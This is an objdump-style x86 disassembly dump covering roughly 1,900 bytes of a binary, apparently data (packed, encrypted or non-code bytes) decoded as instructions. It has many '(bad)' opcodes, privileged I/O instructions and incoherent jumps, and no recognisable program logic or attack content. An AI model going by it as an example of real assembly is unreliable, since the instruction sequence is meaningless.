  415893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415894:	lds    ebp,FWORD PTR [ecx+0x42]
  415897:	icebp  
  415898:	mov    ch,0xb1
  41589a:	and    ebx,DWORD PTR [esi-0xf]
  41589d:	sub    eax,0x80285638
  4158a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158a3:	jmp    0x41590c
  4158a5:	sbb    al,0xda
  4158a7:	leave  
  4158a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a9:	xchg   esi,eax
  4158aa:	cmp    dl,al
  4158ac:	mov    ds:0x2fb018e9,eax
  4158b1:	or     bh,BYTE PTR [edx]
  4158b3:	add    ebp,ebx
  4158b5:	adc    BYTE PTR [esi],bl
  4158b7:	test   ebx,ebx
  4158b9:	es ret 0x2007
  4158bd:	cmc    
  4158be:	cs pop edx
  4158c0:	das    
  4158c1:	mov    ds:0x6f4d7793,al
  4158c6:	xchg   ebp,eax
  4158c7:	sbb    DWORD PTR [ebp-0x626aba11],0xa5363c3f
  4158d1:	jmp    0x4158ff
  4158d3:	lock repz adc esp,esp
  4158d7:	aam    0x7c
  4158d9:	adc    ebp,esi
  4158db:	es sub eax,0xb4c8f1b5
  4158e1:	inc    edi
  4158e2:	repnz sub DWORD PTR [esi+0x4dff25d],0x522cb02
  4158ed:	fdiv   DWORD PTR [edi-0x10]
  4158f0:	retf   0x1286
  4158f3:	sahf   
  4158f4:	into   
  4158f5:	dec    edx
  4158f6:	pop    ebx
  4158f7:	mov    edi,0x66283343
  4158fc:	and    eax,0xc069da24
  415901:	push   cs
  415902:	sbb    eax,0x38587837
  415907:	cmp    DWORD PTR [esi],esi
  415909:	sub    dh,ah
  41590b:	push   0x14
  41590d:	cs ret 0xf53c
  415911:	xchg   esp,eax
  415912:	sbb    esi,edx
  415914:	cmp    DWORD PTR [edi],ecx
  415916:	inc    esp
  415917:	call   0x7b56:0xacfbb239
  41591e:	adc    DWORD PTR [ebp-0x793c2bb3],edi
  415924:	(bad)  
  415925:	or     eax,0x969e5bd7
  41592a:	jecxz  0x41593c
  41592c:	jmp    0x85108800
  415931:	mov    ?,esp
  415933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415934:	xlat   BYTE PTR ds:[ebx]
  415935:	mov    edx,0xb26c56c9
  41593a:	push   ecx
  41593b:	xchg   edi,eax
  41593c:	xor    al,BYTE PTR [ebp+edi*2+0x337fc795]
  415943:	shl    BYTE PTR [edx-0x7d],1
  415946:	mov    ds:0x44406d73,eax
  41594b:	sub    bh,0x6b
  41594e:	or     DWORD PTR [esp+ebx*4],esi
  415951:	lods   eax,DWORD PTR ds:[esi]
  415952:	jo     0x415944
  415954:	aaa    
  415955:	inc    eax
  415956:	sti    
  415957:	cmp    eax,0x77a6f39a
  41595c:	(bad)  
  41595d:	push   ss
  41595e:	sbb    bl,al
  415960:	adc    eax,0x92cd4ed1
  415965:	in     eax,0xe4
  415967:	out    dx,al
  415968:	xchg   DWORD PTR ds:0x91b97a3a,ecx
  41596e:	dec    eax
  41596f:	mov    bl,0xb2
  415971:	mov    al,BYTE PTR [ecx-0x49]
  415974:	fcmovb st,st(6)
  415976:	aas    
  415977:	repz arpl bp,ax
  41597a:	mov    al,0x29
  41597c:	repz jo 0x41590b
  41597f:	out    0xbf,eax
  415981:	jnp    0x415990
  415983:	ror    esi,0x3c
  415986:	cli    
  415987:	(bad)  [ebx-0x2a75322b]
  41598d:	xor    al,BYTE PTR [eax+eiz*4]
  415990:	push   es
  415991:	(bad)  
  415992:	pusha  
  415993:	rcl    BYTE PTR [ecx+0x264654bc],cl
  415999:	retf   0xeb4d
  41599c:	(bad)  
  41599e:	jle    0x415945
  4159a0:	add    edi,DWORD PTR [ebp+0x1a758555]
  4159a6:	push   esi
  4159a7:	pop    edi
  4159a8:	ror    DWORD PTR [eax],0x27
  4159ab:	test   eax,0x861b2b4b
  4159b0:	mov    ah,ch
  4159b2:	sbb    BYTE PTR [ecx+0x44234892],dl
  4159b8:	fstp   TBYTE PTR [edx+0x22]
  4159bb:	stos   BYTE PTR es:[edi],al
  4159bc:	jp     0x4159d3
  4159be:	fsub   QWORD PTR [edx+0x2d]
  4159c1:	lods   eax,DWORD PTR ds:[esi]
  4159c2:	xchg   ebx,eax
  4159c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159c4:	and    al,0x3a
  4159c6:	pop    ebx
  4159c7:	xchg   esi,eax
  4159c8:	mov    dh,0x14
  4159ca:	sub    edx,edi
  4159cc:	fimul  DWORD PTR [ebx-0x54]
  4159cf:	xlat   BYTE PTR ds:[ebx]
  4159d0:	inc    esi
  4159d1:	jnp    0x415993
  4159d3:	test   dl,dh
  4159d5:	adc    eax,0x79532d47
  4159da:	leave  
  4159db:	or     DWORD PTR [eax-0x2],edx
  4159de:	dec    esp
  4159df:	inc    ebp
  4159e0:	xor    al,0xe3
  4159e2:	mov    al,ds:0x33f78ac4
  4159e7:	jmp    0x197b:0xe94e4900
  4159ee:	lea    eax,[ecx+eax*8+0x21]
  4159f2:	jmp    0x24f7:0xae83a7f3
  4159f9:	inc    ecx
  4159fa:	cmp    al,cl
  4159fc:	dec    esi
  4159fd:	push   0xffffffdd
  4159ff:	pusha  
  415a00:	dec    ebp
  415a01:	repz add al,0x9b
  415a04:	pushf  
  415a05:	mov    BYTE PTR [edx],dl
  415a07:	xchg   ecx,eax
  415a08:	push   eax
  415a09:	addr16 pushf 
  415a0b:	std    
  415a0c:	push   0x6e
  415a0e:	cmp    al,0x5c
  415a10:	ror    BYTE PTR [edi*4+0xf21a2ef],1
  415a17:	sub    esi,DWORD PTR [ecx-0x2f60c17]
  415a1d:	sti    
  415a1e:	test   eax,0x534014be
  415a23:	loop   0x415a29
  415a25:	inc    ebx
  415a26:	in     eax,0x69
  415a28:	adc    DWORD PTR [ebx+0x1],ebp
  415a2b:	fcom   DWORD PTR [ebp-0x679ac18b]
  415a31:	out    dx,al
  415a32:	mov    ebp,ebp
  415a34:	jbe    0x415a67
  415a36:	nop
  415a37:	popa   
  415a38:	cdq    
  415a39:	mov    cl,0x69
  415a3b:	mov    edx,0x12b57779
  415a40:	xchg   esp,eax
  415a41:	adc    ah,BYTE PTR [edx+0x628b66a0]
  415a47:	sbb    DWORD PTR [ecx-0x45e795b],eax
  415a4d:	lods   al,BYTE PTR ds:[esi]
  415a4e:	icebp  
  415a4f:	cmp    DWORD PTR [ecx-0x5bb45683],ecx
  415a55:	add    esp,DWORD PTR ds:0x87a09b8a
  415a5b:	xor    al,0x4a
  415a5d:	xchg   bh,dl
  415a5f:	jae    0x4159e1
  415a61:	jnp    0x415aba
  415a63:	inc    edi
  415a64:	loope  0x415a2e
  415a66:	mov    ds:0x24934a8,eax
  415a6b:	inc    eax
  415a6c:	xchg   ebp,eax
  415a6d:	popf   
  415a6e:	outs   dx,BYTE PTR ds:[esi]
  415a6f:	sub    BYTE PTR [ebx+0x2d],0xdb
  415a73:	mov    dh,0xad
  415a75:	jmp    0x415aa2
  415a77:	xchg   esi,eax
  415a78:	popf   
  415a79:	data16 jno 0x415a9f
  415a7c:	call   0x2d70:0xab7cd57f
  415a83:	sbb    esi,DWORD PTR [edx+ebp*2+0x7ab5a63c]
  415a8a:	or     eax,esi
  415a8c:	mov    bl,0x20
  415a8e:	add    ecx,DWORD PTR [ebx-0x4acab67]
  415a94:	aam    0x52
  415a96:	jbe    0x415b05
  415a98:	add    DWORD PTR [ebp+ebp*1-0x5aea7331],edx
  415a9f:	pusha  
  415aa0:	popa   
  415aa1:	leave  
  415aa2:	fcomp  DWORD PTR ds:0xc139495d
  415aa8:	in     al,dx
  415aa9:	(bad)  
  415aab:	xor    BYTE PTR [edi+0x12],ah
  415aae:	inc    eax
  415aaf:	add    esp,DWORD PTR [esi]
  415ab1:	repz addr16 hlt 
  415ab4:	push   ss
  415ab5:	(bad)  [edx-0x74]
  415ab8:	push   es
  415ab9:	pop    edx
  415aba:	mov    esp,0x240b8ea5
  415abf:	js     0x415ac6
  415ac1:	fbld   TBYTE PTR [edi]
  415ac3:	cmp    DWORD PTR [edx],ebp
  415ac5:	mov    BYTE PTR [edx+0x6d],bl
  415ac8:	les    esp,FWORD PTR [edi]
  415aca:	je     0x415a55
  415acc:	or     DWORD PTR [esp+ecx*8],esp
  415acf:	mov    ah,0x3e
  415ad1:	addr16 sbb al,0x60
  415ad4:	cld    
  415ad5:	fsin   
  415ad7:	lods   al,BYTE PTR ds:[esi]
  415ad8:	add    al,0xf1
  415ada:	adc    DWORD PTR [ecx],esp
  415adc:	mov    edx,DWORD PTR [edi-0x25]
  415adf:	fidiv  WORD PTR [esi+0x386b717c]
  415ae5:	cli    
  415ae6:	stos   BYTE PTR es:[edi],al
  415ae7:	jecxz  0x415b4b
  415ae9:	daa    
  415aea:	push   eax
  415aeb:	out    dx,al
  415aec:	scas   eax,DWORD PTR es:[edi]
  415aed:	adc    al,bl
  415aef:	mov    esp,0xf08cd3ed
  415af4:	jno    0x415b60
  415af6:	push   ebx
  415af7:	cmp    ch,BYTE PTR [edi+0x1a1c6448]
  415afd:	scas   al,BYTE PTR es:[edi]
  415afe:	add    eax,0x2d9086a9
  415b03:	ds cmp al,0xbf
  415b06:	nop
  415b07:	ins    DWORD PTR es:[edi],dx
  415b08:	or     eax,0x19599263
  415b0d:	sahf   
  415b0e:	repz dec eax
  415b10:	mov    ebp,0x29adde6f
  415b15:	push   ss
  415b16:	sbb    BYTE PTR [esi+0x50892721],bh
  415b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b1d:	jecxz  0x415b03
  415b1f:	or     BYTE PTR [ebx+esi*8],0x76
  415b23:	pop    ss
  415b24:	push   esi
  415b25:	mov    ds:0x5908f63e,al
  415b2a:	mov    ss,WORD PTR [ecx-0x78]
  415b2d:	jp     0x415ac5
  415b2f:	adc    dh,BYTE PTR [ecx+eiz*1]
  415b32:	int    0xac
  415b34:	mov    edx,gs
  415b36:	pop    ebp
  415b37:	mov    eax,ds:0xcee2be2a
  415b3c:	es hlt 
  415b3e:	scas   al,BYTE PTR es:[edi]
  415b3f:	sub    ah,BYTE PTR [esp+ebp*1]
  415b42:	stc    
  415b43:	rcl    DWORD PTR [ecx+0x391d3b47],0xa9
  415b4a:	add    edi,edx
  415b4c:	pop    esi
  415b4d:	or     al,0xf6
  415b4f:	mov    ch,0xed
  415b51:	lods   eax,DWORD PTR ds:[esi]
  415b52:	mov    esp,0xaae37d68
  415b57:	push   ds
  415b58:	in     eax,dx
  415b59:	nop
  415b5a:	pop    edi
  415b5b:	pusha  
  415b5c:	icebp  
  415b5d:	push   esp
  415b5e:	dec    ecx
  415b5f:	adc    al,0x9e
  415b61:	sahf   
  415b62:	lahf   
  415b63:	cdq    
  415b64:	xchg   BYTE PTR [edx+edi*2-0x53d600f7],al
  415b6b:	daa    
  415b6c:	shl    al,cl
  415b6e:	popa   
  415b6f:	test   al,0xc1
  415b71:	leave  
  415b72:	cmp    ch,BYTE PTR [ebp+0x4145d33d]
  415b78:	mov    esi,DWORD PTR [edi-0x2a]
  415b7b:	mov    edi,0xa730d8ed
  415b80:	mov    ds:0xb6a54431,al
  415b85:	fcomp  QWORD PTR [ecx]
  415b87:	or     esp,ecx
  415b89:	lock xchg ecx,eax
  415b8b:	aaa    
  415b8c:	cli    
  415b8d:	mov    bh,0x4b
  415b8f:	rol    BYTE PTR [edx],0xe5
  415b92:	mov    al,0x99
  415b94:	sahf   
  415b95:	scas   eax,DWORD PTR es:[edi]
  415b96:	inc    ebx
  415b97:	and    eax,0xd7c0abb0
  415b9c:	cli    
  415b9d:	adc    eax,0xfc9e5055
  415ba2:	xor    al,0x7d
  415ba4:	jg     0x415ba0
  415ba6:	inc    esp
  415ba7:	cwde   
  415ba8:	dec    edx
  415ba9:	shl    DWORD PTR [ebp-0x73f5c1e0],1
  415baf:	int    0xdb
  415bb1:	dec    edi
  415bb2:	shr    DWORD PTR [ebp+eax*1+0x3f1cdae2],0x4b
  415bba:	pop    edx
  415bbb:	outs   dx,BYTE PTR ds:[esi]
  415bbc:	sbb    eax,0x37df67f9
  415bc1:	sub    BYTE PTR [eax-0x3b],dl
  415bc4:	(bad)  
  415bc5:	ret    
  415bc6:	push   ebp
  415bc7:	in     al,0x23
  415bc9:	jb     0x415b56
  415bcb:	mov    ch,0x49
  415bcd:	xchg   DWORD PTR [ebp-0x13],esp
  415bd0:	sub    dl,bl
  415bd2:	(bad)  
  415bd4:	fisttp WORD PTR [ecx-0x4f]
  415bd7:	pop    eax
  415bd8:	addr16 inc ebp
  415bda:	ss mov dh,0x77
  415bdd:	fcomp  QWORD PTR [edx-0x34]
  415be0:	add    esp,DWORD PTR [edx+0x13d7c083]
  415be6:	xchg   edx,eax
  415be7:	sbb    BYTE PTR [ebx],dh
  415be9:	(bad)  
  415bea:	repnz sbb bh,BYTE PTR [ebx+0x22fc9f12]
  415bf1:	jle    0x415bdf
  415bf3:	adc    eax,DWORD PTR [ecx]
  415bf5:	inc    esp
  415bf6:	push   es
  415bf7:	mov    dh,0x90
  415bf9:	(bad)  
  415bfa:	jecxz  0x415bd1
  415bfc:	jp     0x415c48
  415bfe:	xor    DWORD PTR [edi+edi*1-0x6a58473a],eax
  415c05:	outs   dx,DWORD PTR ds:[esi]
  415c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c07:	push   0xa2f85d84
  415c0c:	leave  
  415c0d:	ror    al,0x27
  415c10:	jg     0x415c67
  415c12:	cmp    ebp,DWORD PTR [edx+0x7e]
  415c15:	out    0xc,al
  415c17:	test   BYTE PTR [si+0x67a9],al
  415c1c:	mov    esp,0x88eed7b2
  415c21:	retf   
  415c22:	dec    edx
  415c23:	call   0xd23:0x91739e56
  415c2a:	popa   
  415c2b:	pop    ss
  415c2c:	dec    ecx
  415c2d:	pop    esi
  415c2e:	xchg   DWORD PTR [esi+0x7c],edx
  415c31:	inc    eax
  415c32:	fs xchg edx,eax
  415c34:	add    bl,al
  415c36:	xor    BYTE PTR ds:0xd155df84,ah
  415c3c:	and    eax,0x89227a94
  415c41:	inc    ebp
  415c42:	or     bl,dh
  415c44:	and    al,0xcc
  415c46:	sbb    dh,BYTE PTR [ebp+0x46]
  415c49:	cmp    DWORD PTR [ecx+ebp*8-0x5d],0xf6d97a24
  415c51:	scas   eax,DWORD PTR es:[edi]
  415c52:	dec    edi
  415c53:	mov    edx,0xe76c21b3
  415c58:	mov    edi,0xd84c8bd9
  415c5d:	xor    eax,0xfefce360
  415c62:	ss mov bl,0x55
  415c65:	adc    DWORD PTR [esi],eax
  415c67:	fnsave [edi+ebp*1-0x3a]
  415c6b:	xchg   edi,eax
  415c6c:	sbb    eax,esp
  415c6e:	fst    DWORD PTR [edx-0x3832b57d]
  415c74:	iret   
  415c75:	push   eax
  415c76:	add    DWORD PTR [ebp-0x67],ecx
  415c79:	ins    DWORD PTR es:[edi],dx
  415c7a:	fild   DWORD PTR [ecx]
  415c7c:	pop    edi
  415c7d:	cmc    
  415c7e:	leave  
  415c7f:	jge    0x415c12
  415c81:	test   DWORD PTR [ebp+edi*1+0x3e],eax
  415c85:	dec    BYTE PTR [edi-0x5f]
  415c88:	cmp    bh,al
  415c8a:	inc    esp
  415c8b:	nop
  415c8c:	(bad)  
  415c8d:	lods   eax,DWORD PTR ds:[esi]
  415c8e:	fs adc al,0x81
  415c91:	ds in  al,0x51
  415c94:	iret   
  415c95:	shl    DWORD PTR [eax+0x61],0x4f
  415c99:	dec    esi
  415c9a:	pop    edx
  415c9b:	pop    ecx
  415c9c:	clc    
  415c9d:	cmp    ecx,ecx
  415c9f:	stos   BYTE PTR es:[edi],al
  415ca0:	rcl    edi,cl
  415ca2:	add    al,0x9c
  415ca4:	out    dx,eax
  415ca5:	push   ebx
  415ca6:	mov    ds:0x963e2300,al
  415cab:	inc    esi
  415cac:	mov    ah,0xbf
  415cae:	xchg   ebx,eax
  415caf:	retf   0xa4a8
  415cb2:	lods   al,BYTE PTR ds:[esi]
  415cb3:	jno    0x415ccd
  415cb5:	repnz outs dx,BYTE PTR ds:[esi]
  415cb7:	popf   
  415cb8:	cmp    cl,BYTE PTR ds:0xa9c10369
  415cbe:	outs   dx,DWORD PTR ds:[esi]
  415cbf:	sub    ah,BYTE PTR [edi]
  415cc1:	mov    ss,WORD PTR [ecx]
  415cc3:	cmc    
  415cc4:	daa    
  415cc5:	jbe    0x415d1f
  415cc7:	adc    al,0xe2
  415cc9:	dec    edx
  415cca:	push   edx
  415ccb:	xchg   ecx,eax
  415ccc:	lea    edi,gs:[edi]
  415ccf:	adc    eax,0x1622938e
  415cd4:	call   0xf7c170f9
  415cd9:	lods   al,BYTE PTR ds:[esi]
  415cda:	and    esp,DWORD PTR [edx]
  415cdc:	int    0xad
  415cde:	adc    al,0xf6
  415ce0:	xchg   edx,eax
  415ce1:	stc    
  415ce2:	mov    al,0xc4
  415ce4:	mov    cl,0x7a
  415ce6:	adc    al,0x78
  415ce8:	adc    al,BYTE PTR [bx+di+0x13]
  415cec:	push   DWORD PTR [edi-0xc]
  415cef:	adc    ecx,DWORD PTR [edi]
  415cf1:	jbe    0x415ceb
  415cf3:	cdq    
  415cf4:	iret   
  415cf5:	mov    esi,0x9f8a03f4
  415cfa:	popf   
  415cfb:	pop    ebx
  415cfc:	jmp    DWORD PTR [edi+0x32]
  415cff:	mov    DWORD PTR [ebx],edi
  415d01:	sub    DWORD PTR [ecx],eax
  415d03:	cmp    BYTE PTR [ebx-0x3b],al
  415d06:	sti    
  415d07:	push   0x57056045
  415d0c:	(bad)  
  415d0d:	sub    ebx,esp
  415d0f:	ror    BYTE PTR [edi],1
  415d11:	xchg   edx,eax
  415d12:	mov    ebx,0x16f63c55
  415d17:	pusha  
  415d18:	fstp   QWORD PTR [edi+0x5558942b]
  415d1e:	ds cli 
  415d20:	arpl   WORD PTR [ebp+0x13],bp
  415d23:	outs   dx,DWORD PTR ds:[esi]
  415d24:	lods   al,BYTE PTR ds:[esi]
  415d25:	mov    ss,WORD PTR [ecx]
  415d27:	cmp    ebp,DWORD PTR [esi]
  415d29:	push   esi
  415d2a:	loopne 0x415d96
  415d2c:	and    edx,DWORD PTR [esi+0x7b739fd4]
  415d32:	xchg   esi,eax
  415d33:	das    
  415d34:	or     BYTE PTR [edx],0xc3
  415d37:	test   DWORD PTR [esi+0x15],ecx
  415d3a:	push   eax
  415d3b:	jne    0x415d14
  415d3d:	jmp    0x415d6a
  415d3f:	adc    al,0xfb
  415d41:	fwait
  415d42:	in     eax,dx
  415d43:	push   eax
  415d44:	inc    esp
  415d45:	shr    BYTE PTR [eax+0x58f4c115],1
  415d4b:	ss jno 0x415cfb
  415d4e:	shl    edx,cl
  415d50:	neg    BYTE PTR [ebp-0x7e501251]
  415d56:	popa   
  415d57:	(bad)  
  415d59:	lahf   
  415d5a:	add    eax,0xcf667f08
  415d5f:	sub    DWORD PTR [edx-0x7f],esi
  415d62:	and    edx,esp
  415d64:	cli    
  415d65:	xchg   ebp,eax
  415d66:	pop    es
  415d67:	jmp    0x2552:0x3564a577
  415d6e:	adc    BYTE PTR [esi],cl
  415d70:	pop    esp
  415d71:	cld    
  415d72:	cwde   
  415d73:	arpl   dx,sp
  415d75:	mov    ebp,0x83a902f0
  415d7a:	stos   DWORD PTR es:[edi],eax
  415d7b:	int    0xb7
  415d7d:	jge    0x415db5
  415d7f:	dec    eax
  415d80:	mov    edx,0x26cb55cd
  415d85:	fisubr DWORD PTR [ebx+0x40]
  415d88:	scas   al,BYTE PTR es:[edi]
  415d89:	es sbb al,dh
  415d8c:	xchg   edx,eax
  415d8d:	das    
  415d8e:	adc    bh,BYTE PTR [esi-0x44b7c093]
  415d94:	cmc    
  415d95:	inc    eax
  415d96:	repz jge 0x415ded
  415d99:	cmp    eax,0xef8d4bbf
  415d9e:	pop    ss
  415d9f:	push   ebx
  415da0:	cmp    eax,0x133e0989
  415da5:	ret    0x5f36
  415da8:	retf   
  415da9:	outs   dx,BYTE PTR ds:[esi]
  415daa:	(bad)  
  415dab:	push   esi
  415dac:	(bad)  
  415dad:	(bad)  
  415dae:	jno    0x415dbc
  415db0:	xor    DWORD PTR [ebp+0x1411942c],edx
  415db6:	shl    BYTE PTR ds:0xe7a74991,0xab
  415dbd:	push   cs
  415dbe:	in     eax,0x68
  415dc0:	adc    al,0xb
  415dc2:	dec    eax
  415dc3:	stos   DWORD PTR es:[edi],eax
  415dc4:	adc    BYTE PTR [eax],al
  415dc6:	push   cs
  415dc7:	add    cl,BYTE PTR [ebx]
  415dc9:	mov    WORD PTR [esi+edx*8-0x14],fs
  415dcd:	mov    ebp,DWORD PTR [ebx]
  415dcf:	es lock cmp eax,0x29e3d3bc
  415dd6:	mov    eax,0xaa262d60
  415ddb:	sub    dh,BYTE PTR [ebp+0x5b670225]
  415de1:	and    DWORD PTR [esi+0x6183c62],0x39
  415de8:	ins    BYTE PTR es:[edi],dx
  415de9:	and    BYTE PTR [ebx],bh
  415deb:	outs   dx,BYTE PTR ds:[esi]
  415dec:	out    0x47,al
  415dee:	retf   
  415def:	retf   
  415df0:	out    dx,al
  415df1:	mov    ch,0xfa
  415df3:	stc    
  415df4:	inc    edi
  415df5:	push   ss
  415df6:	mov    cl,0x47
  415df8:	and    eax,0x6ebcbbb1
  415dfd:	mov    ah,bh
  415dff:	mov    dl,BYTE PTR [esi-0x2f]
  415e02:	push   ebp
  415e03:	or     al,0xe1
  415e05:	pop    ebx
  415e06:	nop
  415e07:	cwde   
  415e08:	and    DWORD PTR [edi+0x2f],ebp
  415e0b:	lods   al,BYTE PTR ds:[esi]
  415e0c:	or     bh,BYTE PTR [ebx-0x7120d2ac]
  415e12:	scas   eax,DWORD PTR es:[edi]
  415e13:	mov    ah,0xdd
  415e15:	mov    WORD PTR [ecx-0x8],ss
  415e18:	aaa    
  415e19:	nop
  415e1a:	dec    esi
  415e1b:	cli    
  415e1c:	push   esi
  415e1d:	lods   eax,DWORD PTR ds:[esi]
  415e1e:	mov    cl,0x89
  415e20:	(bad)  
  415e21:	sti    
  415e22:	aaa    
  415e23:	adc    al,0x72
  415e25:	sbb    ebx,ebx
  415e27:	jno    0x415e6e
  415e29:	into   
  415e2a:	mov    ds:0x6c36b4ba,al
  415e2f:	(bad)  
  415e30:	pop    edx
  415e31:	or     eax,0x3e6a2bc0
  415e36:	inc    edx
  415e37:	out    dx,eax
  415e38:	push   cs
  415e39:	(bad)  
  415e3a:	das    
  415e3b:	fs (bad) 
  415e3d:	sbb    ch,BYTE PTR [eax]
  415e3f:	mov    bl,0xe0
  415e41:	mov    ds:0xeaf34fcf,eax
  415e46:	pop    ebx
  415e47:	or     al,0xe0
  415e49:	inc    eax
  415e4a:	pop    esi
  415e4b:	mov    ch,BYTE PTR [ebp-0x355f07f7]
  415e51:	aad    0xcf
  415e53:	sub    BYTE PTR [ebp+0x4f],al
  415e56:	outs   dx,BYTE PTR ds:[esi]
  415e57:	jmp    0x14561cbd
  415e5c:	sbb    DWORD PTR [ebp+0x44],eax
  415e5f:	jmp    0x43e24a4c
  415e64:	adc    al,0x2a
  415e66:	xlat   BYTE PTR ds:[ebx]
  415e67:	iret   
  415e68:	cmc    
  415e69:	jg     0x415eba
  415e6b:	pushf  
  415e6c:	xchg   BYTE PTR [edx],dl
  415e6e:	jne    0x415e26
  415e70:	cmp    al,0xa
  415e72:	adc    eax,0x19af2c9d
  415e77:	repnz xchg ecx,eax
  415e79:	bound  ebp,QWORD PTR [eax+0x3a]
  415e7c:	xchg   edi,eax
  415e7d:	sub    eax,0xd23a2323
  415e82:	scas   eax,DWORD PTR es:[edi]
  415e83:	cld    
  415e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e85:	add    edx,edi
  415e87:	push   edi
  415e88:	test   BYTE PTR [edx],bl
  415e8a:	sub    eax,0xc2d25b59
  415e8f:	xchg   esp,eax
  415e90:	cld    
  415e91:	push   ebp
  415e92:	(bad)
  415e97:	mov    ebp,0x2a4e52f5
  415e9c:	imul   ecx,DWORD PTR [ecx+0x24],0x7ae9d355
  415ea3:	ds sti 
  415ea5:	xor    eax,ecx
  415ea7:	(bad)  
  415ea8:	ins    BYTE PTR es:[edi],dx
  415ea9:	add    BYTE PTR ds:0xacedfbb4,ah
  415eaf:	inc    edx
  415eb0:	lods   al,BYTE PTR ds:[esi]
  415eb1:	xor    al,0x75
  415eb3:	int    0x2e
  415eb5:	fdivr  DWORD PTR [ebx-0x2d]
  415eb8:	push   ecx
  415eb9:	mov    bl,BYTE PTR [edx-0x327fcf4b]
  415ebf:	sub    BYTE PTR [esi],bl
  415ec1:	pop    ss
  415ec2:	mov    edi,0x351cc859
  415ec7:	cdq    
  415ec8:	push   ebx
  415ec9:	aaa    
  415eca:	mov    ebx,0xc552fc6e
  415ecf:	jns    0x415f01
  415ed1:	add    dh,cl
  415ed3:	adc    eax,0xa1a1a11
  415ed8:	push   cs
  415ed9:	loopne 0x415ee0
  415edb:	out    dx,eax
  415edc:	dec    esi
  415edd:	je     0x415f4e
  415edf:	push   edx
  415ee0:	sub    al,BYTE PTR [eax-0x3f]
  415ee3:	inc    edi
  415ee4:	add    al,0x6c
  415ee6:	xchg   ecx,eax
  415ee7:	out    dx,al
  415ee8:	test   BYTE PTR [eax-0x64],cl
  415eeb:	stos   DWORD PTR es:[edi],eax
  415eec:	inc    eax
  415eed:	mov    fs,WORD PTR [esi+ebx*8-0x7dd4272d]
  415ef4:	mov    BYTE PTR [ebx+0x2d],al
  415ef7:	dec    esi
  415ef8:	shl    DWORD PTR [edi+0x45843a64],cl
  415efe:	call   0xbaf705b4
  415f03:	inc    ebp
  415f04:	mov    esp,0xc8fed7d6
  415f09:	fld    TBYTE PTR [edi-0x21]
  415f0c:	(bad)  
  415f0d:	out    0xa8,al
  415f0f:	daa    
  415f10:	ins    DWORD PTR es:[edi],dx
  415f11:	lea    esp,[edi+eax*2-0x5e]
  415f15:	stos   DWORD PTR es:[edi],eax
  415f16:	push   ecx
  415f17:	mov    edi,0x75b233a1
  415f1c:	push   ds
  415f1d:	and    eax,0xef6a4b02
  415f22:	jns    0x415f01
  415f24:	mov    ebx,0x247a1900
  415f29:	cmp    ecx,DWORD PTR [eax-0x77]
  415f2c:	cwde   
  415f2d:	push   ss
  415f2e:	loopne 0x415f06
  415f30:	rep stos BYTE PTR es:[edi],al
  415f32:	mov    ds:0x6c3cca8d,al
  415f37:	add    DWORD PTR [ecx+0x15],ecx
  415f3a:	mov    ch,0x1e
  415f3c:	push   ebx
  415f3d:	adc    esp,eax
  415f3f:	int3   
  415f40:	xchg   BYTE PTR [ecx-0x7c3cb70e],al
  415f46:	jmp    0x95280629
  415f4b:	xchg   ebp,eax
  415f4c:	cwde   
  415f4d:	jno    0x415ed9
  415f4f:	or     BYTE PTR [ecx+0x3f],ah
  415f52:	xor    edx,DWORD PTR [ecx]
  415f54:	in     al,0xc6
  415f56:	cmp    al,0xf0
  415f58:	test   al,0xe1
  415f5a:	cdq    
  415f5b:	xchg   ebx,eax
  415f5c:	in     eax,dx
  415f5d:	push   edx
  415f5e:	pop    esi
  415f5f:	push   ds
  415f60:	fldenv [ebx+esi*1-0x3a68d901]
  415f67:	xor    al,0x4b
  415f69:	jne    0x415fe8
  415f6b:	add    esi,esp
  415f6d:	jge    0x415f4c
  415f6f:	aad    0xa
  415f71:	cmp    al,0xe5
  415f73:	jmp    0x49e87cb7
  415f78:	sbb    BYTE PTR [ebx-0x53],al
  415f7b:	dec    edx
  415f7c:	jg     0x415f68
  415f7e:	out    0x47,eax
  415f80:	add    BYTE PTR [esp+eax*8+0x55],dh
  415f84:	pop    eax
  415f85:	mov    ah,BYTE PTR [edx+0xbef1a8c]
  415f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f8c:	xor    ebp,DWORD PTR [edx+0x60]
  415f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f90:	jle    0x415fdb
  415f92:	call   0x2fa19adc
  415f97:	xor    eax,0x8fa449c5
  415f9c:	in     al,0xd7
  415f9e:	adc    BYTE PTR ss:[ebx+ebx*1+0x8756243],al
  415fa6:	enter  0x780c,0x8f
  415faa:	fcom   DWORD PTR [edx-0x70]
  415fad:	(bad)  
  415fb0:	ins    DWORD PTR es:[edi],dx
  415fb1:	pop    esi
  415fb2:	mov    ebp,0x2def2d97
  415fb7:	mov    eax,ds:0xfb584250
  415fbc:	push   esi
  415fbd:	stos   BYTE PTR es:[edi],al
  415fbe:	adc    DWORD PTR [edx+0x7a],edi
  415fc1:	(bad)  
  415fc2:	xor    DWORD PTR ds:0x72a0ffeb,edx
  415fc8:	sti    
  415fc9:	lea    ebp,[edx-0x20b56db9]
  415fcf:	jb     0x415fd6
  415fd1:	popa   
  415fd2:	fnstenv [esi*2+0x6b0bceb7]
  415fd9:	cld    
  415fda:	sub    al,0xa2
  415fdc:	adc    al,0xf6
  415fde:	stc    
  415fdf:	ficomp DWORD PTR [eax]
  415fe1:	lods   eax,DWORD PTR ds:[esi]
  415fe2:	es cld 
  415fe4:	cli    
  415fe5:	mov    bh,0xf6
  415fe7:	jp     0x416003
  415fe9:	adc    al,BYTE PTR [ecx+0x59]
  415fec:	pop    esi
  415fed:	les    eax,FWORD PTR [edi+0x2d]
  415ff0:	adc    al,0xc
  415ff2:	stos   BYTE PTR es:[edi],al
  415ff3:	jecxz  0x416068
  415ff5:	or     DWORD PTR [edi+0x5e],0xf7602871
  415ffc:	xchg   edx,eax
  415ffd:	jnp    0x41601b
  415fff:	cmp    cl,cl
  416001:	add    BYTE PTR [ebx+0x6a19ea87],ah
